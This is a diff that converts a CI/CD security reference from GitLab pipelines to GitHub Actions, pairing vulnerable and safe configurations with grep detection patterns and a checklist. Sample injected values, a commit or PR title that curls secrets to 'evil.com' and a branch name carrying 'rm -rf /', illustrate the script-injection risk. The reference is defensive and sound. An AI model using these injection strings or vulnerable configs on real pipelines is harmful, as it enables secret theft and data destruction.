@@ -1,79 +1,76 @@
-# GitLab CI/CD Security Reference
+# GitHub Actions Security Reference
 
 ## Overview
 
-GitLab CI/CD pipelines execute arbitrary code with access to secrets, infrastructure, and deployment targets. Misconfigurations can leak credentials, allow code injection, or grant attackers access to production environments.
+GitHub Actions workflows execute arbitrary code with access to secrets, infrastructure, and deployment targets. Misconfigurations can leak credentials, allow code injection, or grant attackers access to production environments.
 
 ---
 
-## Secrets in Pipelines
+## Secrets in Workflows
 
 ```yaml
-# VULNERABLE: Hardcoded secrets in .gitlab-ci.yml
-variables:
+# VULNERABLE: Hardcoded secrets in workflow file
+env:
   DB_PASSWORD: "mysecretpassword"
   API_KEY: "sk-12345"
 
 # VULNERABLE: Secrets echoed in logs
-script:
-  - echo $SECRET_TOKEN  # Visible in job logs
-  - curl -H "Authorization: Bearer $API_KEY" https://api.example.com | tee output.log
+- run: |
+    echo $SECRET_TOKEN  # Visible in job logs
+    curl -H "Authorization: Bearer $API_KEY" https://api.example.com | tee output.log
 
-# SAFE: Use CI/CD variables (Settings > CI/CD > Variables)
-# Mark as: Protected (only on protected branches) + Masked (hidden in logs)
-script:
-  - curl -H "Authorization: Bearer $API_KEY" https://api.example.com > /dev/null
+# SAFE: Use repository/environment secrets (Settings > Secrets and variables > Actions)
+- run: curl -H "Authorization: Bearer $API_KEY" https://api.example.com > /dev/null
+  env:
+    API_KEY: ${{ secrets.API_KEY }}
 ```
 
-### Variable Configuration
+### Secret Configuration
 
-| Setting | Purpose | When to Use |
-|---------|---------|-------------|
-| **Protected** | Only available on protected branches/tags | Production secrets, deploy keys |
-| **Masked** | Hidden in job logs | All secrets (tokens, passwords, keys) |
-| **File** | Written to a file instead of env var | Certificates, service account JSON |
+| Setting                  | Purpose                                    | When to Use                     |
+| ------------------------ | ------------------------------------------ | ------------------------------- |
+| **Repository secrets**   | Available to all workflows                 | General tokens, API keys        |
+| **Environment secrets**  | Scoped to specific deployment environments | Production secrets, deploy keys |
+| **Organization secrets** | Shared across repos                        | Team-wide credentials           |
 
 ```yaml
-# VULNERABLE: Unmasked variable visible in logs
-variables:
-  DEPLOY_TOKEN: $CI_DEPLOY_TOKEN  # Not masked — visible if script echoes it
+# VULNERABLE: Secret value passed via expression (may appear in debug logs)
+- run: echo "Token is ${{ secrets.API_KEY }}" # Secret interpolated into run script
 
-# FLAG: Variables without both Protected and Masked for sensitive values
+# FLAG: Expressions that expand secrets directly into run commands
 ```
 
 ---
 
 ## Script Injection
 
-Attacker-controlled CI variables used in `script:` blocks can execute arbitrary commands.
+Attacker-controlled GitHub context values used in `run:` steps can execute arbitrary commands when interpolated directly.
 
-### Attacker-Controlled CI Variables
+### Attacker-Controlled Context Values
 
-| Variable | Source | Risk |
-|----------|--------|------|
-| `$CI_COMMIT_MESSAGE` | Git commit message | Any contributor |
-| `$CI_COMMIT_TITLE` | First line of commit message | Any contributor |
-| `$CI_MERGE_REQUEST_TITLE` | MR title | MR author |
-| `$CI_MERGE_REQUEST_DESCRIPTION` | MR description | MR author |
-| `$CI_COMMIT_TAG` | Git tag name | Tag creator |
-| `$CI_COMMIT_REF_NAME` | Branch/tag name | Branch creator |
+| Value                                     | Source           | Risk           |
+| ----------------------------------------- | ---------------- | -------------- |
+| `${{ github.event.pull_request.title }}`  | PR title         | PR author      |
+| `${{ github.event.pull_request.body }}`   | PR description   | PR author      |
+| `${{ github.event.head_commit.message }}` | Commit message   | Commit author  |
+| `${{ github.ref_name }}`                  | Branch/tag name  | Branch creator |
+| `${{ github.event.issue.title }}`         | Issue title      | Issue author   |
+| `${{ github.event.comment.body }}`        | Issue/PR comment | Commenter      |
 
 ```yaml
-# VULNERABLE: Unescaped variable in script
-script:
-  - echo "Building $CI_COMMIT_MESSAGE"  # Injection via commit message
-  # Attacker commit message: "; curl http://evil.com/steal?token=$SECRET"
+# VULNERABLE: Unescaped context value in run step
+- run: echo "Building ${{ github.event.pull_request.title }}"
+  # Attacker PR title: "; curl http://evil.com/steal?token=$SECRET"
 
-# VULNERABLE: Variable in shell command
-script:
-  - git tag -a "$CI_COMMIT_TAG" -m "Release $CI_COMMIT_TAG"
-  # Attacker tag: "; rm -rf /"
+# VULNERABLE: Context value in shell command
+- run: git tag -a "${{ github.ref_name }}" -m "Release"
+  # Attacker branch: "; rm -rf /"
 
-# SAFE: Use server-controlled variables instead of attacker-controlled ones
-script:
-  - echo "Building commit ${CI_COMMIT_SHORT_SHA}"  # Server-controlled, safe
-  - echo "Pipeline for ${CI_PROJECT_NAME}"          # Server-controlled, safe
-  # Avoid CI_COMMIT_MESSAGE, CI_COMMIT_TITLE, CI_MERGE_REQUEST_TITLE in scripts
+# SAFE: Pass context values via environment variables
+- run: echo "Building $PR_TITLE"
+  env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+  # Shell treats $PR_TITLE as data, not executable code
 ```
 
 ---
@@ -81,24 +78,24 @@ script:
 ## Artifact Security
 
 ```yaml
-# VULNERABLE: Sensitive data in artifacts (accessible to anyone with project access)
-artifacts:
-  paths:
-    - .env
-    - credentials.json
-    - coverage/  # May contain source code paths
+# VULNERABLE: Sensitive data in uploaded artifacts
+- uses: actions/upload-artifact@v4
+  with:
+    name: build-output
+    path: |
+      .env
+      credentials.json
+      coverage/  # May contain source code paths
 
-# VULNERABLE: Public artifacts on public projects
-artifacts:
-  public: true  # Default for public projects — anyone can download
+# VULNERABLE: Artifacts on public repos accessible to anyone
+# Default: artifacts are public on public repositories
 
-# SAFE: Restrict artifact content and access
-artifacts:
-  paths:
-    - build/
-    - test-results/
-  expire_in: 1 week
-  access: developer  # GitLab 15.9+: restrict to specific roles
+# SAFE: Restrict artifact content and set retention
+- uses: actions/upload-artifact@v4
+  with:
+    name: build-output
+    path: build/
+    retention-days: 7
 ```
 
 ---
@@ -106,71 +103,96 @@ artifacts:
 ## Runner Security
 
 ```yaml
-# VULNERABLE: Shared runners with privileged Docker executor
-# Shared runners may execute untrusted code from forks
+# VULNERABLE: Using self-hosted runners for untrusted workflows (e.g., from forks)
+# Self-hosted runners persist state between runs — attackers can poison runner environment
 
-# FLAG: privileged mode in runner config (config.toml)
-# [runners.docker]
-#   privileged = true  # Container can escape to host
+on:
+  pull_request:    # Triggered by fork PRs — can run attacker code on self-hosted runner
+jobs:
+  build:
+    runs-on: self-hosted  # DANGEROUS if PRs from forks trigger this
 
-# SAFE: Project-specific runners for sensitive jobs
-deploy:
-  tags:
-    - project-specific
-    - no-shared
-  script:
-    - deploy.sh
+# SAFE: Use GitHub-hosted runners for workflows triggered by untrusted input
+jobs:
+  build:
+    runs-on: ubuntu-latest  # Ephemeral, isolated
 
-# SAFE: Protected runners for protected branches only
-# Configure in Settings > CI/CD > Runners > Edit > Protected
+# SAFE: For self-hosted runners, restrict to trusted branches/actors
+on:
+  pull_request:
+    branches: [main]
+  push:
+    branches: [main]
 ```
 
 ---
 
-## Include/Extend Risks
+## Workflow Permissions
 
 ```yaml
-# VULNERABLE: Including from untrusted external sources
-include:
-  - remote: 'https://untrusted-site.com/ci-template.yml'
+# VULNERABLE: Default broad GITHUB_TOKEN permissions
+# Without explicit permissions block, token may have write access to all scopes
 
-# VULNERABLE: Including from public repos without pinning
-include:
-  - project: 'some-group/templates'
-    ref: main  # Could change at any time
-    file: 'ci-template.yml'
+# SAFE: Use minimal permissions
+permissions:
+  contents: read
+  pull-requests: write # Only if needed
 
-# SAFE: Pin includes to specific commit SHA
-include:
-  - project: 'my-group/ci-templates'
-    ref: 'abc123def456'  # Pinned to known-good commit
-    file: 'ci-template.yml'
+jobs:
+  build:
+    permissions:
+      contents: read # Job-level override (most restrictive wins)
+```
 
-# SAFE: Local includes (same repo)
-include:
-  - local: '.gitlab/ci/build.yml'
+```yaml
+# VULNERABLE: Passing GITHUB_TOKEN to untrusted actions
+- uses: untrusted-org/action@main
+  with:
+    token: ${{ secrets.GITHUB_TOKEN }} # Grants write access to attacker's action
+
+# SAFE: Scope token to minimum needed; avoid passing to third-party actions
 ```
 
 ---
 
-## Permissions
+## Third-Party Action Pinning
 
 ```yaml
-# VULNERABLE: CI_JOB_TOKEN with broad scope
-# Default CI_JOB_TOKEN can access other projects — restrict in Settings
+# VULNERABLE: Using mutable tags — can change at any time
+- uses: actions/checkout@v4
+- uses: some-org/some-action@main # Branch tip — attacker can push malicious code
 
-# CHECK: Token scope in Settings > CI/CD > Token Access
-# Limit which projects can use this project's CI_JOB_TOKEN
+# VULNERABLE: Using latest tag
+- uses: some-action@latest
 
-# VULNERABLE: Deploy keys with write access on non-protected branches
-# Deploy keys should be read-only unless writing is required
+# SAFE: Pin to specific commit SHA
+- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+- uses: some-org/some-action@abc123def456789... # Pinned to known-good commit
 
-# SAFE: Restrict pipeline creation to protected branches
-# Use "protected" variables and "protected" runners
+# ACCEPTABLE: Trusted, well-maintained actions with verified SHA in comment
+- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+```
 
-# SAFE: Require approval for MR pipelines from forks
-# Settings > General > Merge requests > "Pipelines must succeed"
-# Settings > CI/CD > General pipelines > "Protected" fork pipelines
+---
+
+## `pull_request_target` Risks
+
+```yaml
+# VULNERABLE: Checking out PR code in pull_request_target context
+# pull_request_target runs with write permissions and access to secrets
+on:
+  pull_request_target:
+jobs:
+  build:
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }} # Checks out attacker code
+      - run: npm install && npm run build # Executes attacker-controlled code with secrets access
+
+
+# SAFE: If you must use pull_request_target, never check out or execute PR code in the same job
+# Split into two jobs: one to check out/build (no secrets), one to deploy (no PR code)
 ```
 
 ---
@@ -178,36 +200,25 @@ include:
 ## Docker-in-Docker
 
 ```yaml
-# VULNERABLE: DinD with privileged mode
-services:
-  - docker:dind
-variables:
-  DOCKER_HOST: tcp://docker:2375  # Unencrypted
-script:
-  - docker build -t myimage .
+# VULNERABLE: Privileged container mode
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    container:
+      image: docker:latest
+      options: --privileged  # Container can escape to host
 
 # VULNERABLE: Mounting Docker socket
-services:
-  - name: docker:dind
-    command: ["--host=tcp://0.0.0.0:2375"]  # No TLS
-variables:
-  DOCKER_HOST: tcp://docker:2375
+- run: docker run -v /var/run/docker.sock:/var/run/docker.sock myimage
 
 # SAFE: Use Kaniko for unprivileged image builds
-build:
-  image:
-    name: gcr.io/kaniko-project/executor:debug
-    entrypoint: [""]
-  script:
-    - /kaniko/executor --context $CI_PROJECT_DIR --destination $CI_REGISTRY_IMAGE:$CI_COMMIT_TAG
+- uses: docker/build-push-action@v5
+  with:
+    context: .
+    push: true
+    tags: myimage:latest
 
-# SAFE: DinD with TLS
-services:
-  - docker:dind
-variables:
-  DOCKER_HOST: tcp://docker:2376
-  DOCKER_TLS_CERTDIR: "/certs"
-  DOCKER_TLS_VERIFY: 1
+# SAFE: Use GitHub's built-in Docker support (no privileged mode needed)
 ```
 
 ---
@@ -215,47 +226,47 @@ variables:
 ## Grep Patterns
 
 ```bash
-# Hardcoded secrets in CI config
-grep -rn "password\|secret\|api_key\|token.*=" --include=".gitlab-ci.yml" --include="*.yml" .gitlab/
+# Hardcoded secrets in workflow files
+grep -rn "password\|secret\|api_key\|token.*=" --include="*.yml" .github/workflows/
 
-# Script injection (attacker-controlled variables in scripts)
-grep -rn "CI_COMMIT_MESSAGE\|CI_COMMIT_TITLE\|CI_MERGE_REQUEST_TITLE\|CI_MERGE_REQUEST_DESCRIPTION" --include=".gitlab-ci.yml"
+# Script injection (attacker-controlled context values interpolated into run steps)
+grep -rn "github\.event\.pull_request\.title\|github\.event\.pull_request\.body\|github\.event\.head_commit\.message" --include="*.yml" .github/workflows/
 
 # Echoing secrets
-grep -rn "echo.*\$\|tee\|>.*log" --include=".gitlab-ci.yml" | grep -i "token\|secret\|key\|pass"
+grep -rn "echo.*\$\|tee\|>.*log" --include="*.yml" .github/workflows/ | grep -i "token\|secret\|key\|pass"
 
-# Unpinned remote includes
-grep -rn "remote:" --include=".gitlab-ci.yml"
+# Unpinned third-party actions (using branch/tag ref)
+grep -rn "uses:.*@main\|uses:.*@master\|uses:.*@latest\|uses:.*@v[0-9]" --include="*.yml" .github/workflows/
 
 # Privileged Docker
-grep -rn "privileged\|docker:dind\|DOCKER_HOST" --include=".gitlab-ci.yml"
+grep -rn "privileged\|docker\.sock\|DOCKER_HOST" --include="*.yml" .github/workflows/
 
-# Public artifacts
-grep -rn "public: true" --include=".gitlab-ci.yml"
+# pull_request_target with checkout
+grep -B10 "pull_request_target" .github/workflows/*.yml | grep -A5 "checkout"
 
 # Sensitive files in artifacts
-grep -A5 "artifacts:" --include=".gitlab-ci.yml" | grep "\.env\|credentials\|\.pem\|\.key"
+grep -A5 "upload-artifact" .github/workflows/*.yml | grep "\.env\|credentials\|\.pem\|\.key"
 ```
 
 ---
 
 ## Testing Checklist
 
-- [ ] No hardcoded secrets in `.gitlab-ci.yml`
-- [ ] All sensitive variables marked as Protected + Masked
-- [ ] No attacker-controlled variables used unescaped in `script:` blocks
-- [ ] No sensitive data in artifacts
-- [ ] Remote includes pinned to specific commit SHA
-- [ ] `CI_JOB_TOKEN` scope restricted
-- [ ] Privileged Docker mode justified or replaced with Kaniko
-- [ ] DinD uses TLS when required
-- [ ] Fork pipelines require approval
-- [ ] Deploy keys are read-only unless write is explicitly needed
+- [ ] No hardcoded secrets in `.github/workflows/*.yml`
+- [ ] All sensitive values passed via `${{ secrets.* }}` with `env:` binding (not direct interpolation)
+- [ ] No attacker-controlled context values (`pr.title`, `commit.message`) directly in `run:` steps
+- [ ] No sensitive data in uploaded artifacts
+- [ ] Third-party actions pinned to specific commit SHA (not branch/tag)
+- [ ] `GITHUB_TOKEN` permissions explicitly minimized via `permissions:` block
+- [ ] `pull_request_target` workflows never check out or execute PR code
+- [ ] Self-hosted runners not used for workflows triggered by untrusted fork PRs
+- [ ] Privileged container mode justified or replaced with safer alternative
+- [ ] `GITHUB_TOKEN` not passed to untrusted third-party actions
 
 ---
 
 ## References
 
-- [GitLab CI/CD Security](https://docs.gitlab.com/ee/ci/security/)
+- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
 - [OWASP CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)
-- [GitLab Runner Security](https://docs.gitlab.com/runner/security/)
+- [GitHub Actions: Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
